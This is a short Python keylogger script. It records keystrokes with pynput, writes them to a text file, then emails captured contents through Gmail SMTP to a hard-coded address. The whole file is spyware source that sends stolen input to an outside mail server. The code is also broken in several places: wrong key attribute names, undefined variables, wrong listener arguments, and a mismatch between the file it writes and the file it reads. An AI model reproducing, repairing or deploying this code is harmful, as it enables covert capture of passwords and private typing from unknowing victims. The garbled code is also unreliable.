from pynput import keyboard
import smtplib,ssl
s_mail = "sendermail@mail.com"
r_mail = "receivermail@mail.com"
passwd = "password"
port = 587
msg = ""

def write(text):
    with open("new.txt",'a') as a:
        a.write(text)
        a.close()
def if_press(k):
    try:
        if(k==keyboard.k.enter):
            write("\n")
        else:
            write(k.char)
    except AttributeError:
        if(k == keyboard.k.backspace):
            write("*Backspace Pressed*")
        elif(k==keyboard.k.tab):
            write("*Tab Pressed*")
        elif(Key == keyboard.k.space):
            write(" ")
        else:
            b=repr(k)+"pressed"
            write(temp)
def if_released(k):
    if(k==keyboard.k.esc):
        return False
with keyboard.Listener(press= if_press,released= if_released) as listener:
    listener.join()
with open("key.txt",'r') as f:
    temp = f.read()
    msg=msg+str(temp)
    f.close()
context = ssl.create_default_context()
server = smtplib.SMTP('smtp.gmail.com', port)
server.starttls()
server.login(s_mail,passwd)
server.sendmail(s_mail,r_mail,msg)
print("Email Sent to ",s_mail)
server.quit()
